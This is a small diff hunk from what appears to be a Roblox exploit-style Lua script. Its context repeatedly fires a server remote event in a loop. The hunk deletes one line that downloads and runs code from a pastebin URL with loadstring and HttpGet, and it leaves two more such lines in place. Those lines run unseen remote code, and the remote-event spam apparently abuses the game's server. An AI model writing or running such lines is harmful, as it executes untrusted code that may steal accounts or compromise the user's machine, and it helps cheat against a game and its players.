@@ -347,6 +347,6 @@ local args = {
 game:GetService("ReplicatedStorage"):WaitForChild("5067030470Event"):FireServer(unpack(args))
 wait(0.1)
 end
-loadstring(game:HttpGet("https://pastebin.com/raw/uCjcYD4f"))()
+
 loadstring(game:HttpGet("https://pastebin.com/raw/5kqWQiA2"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/NYY48nyG"))()
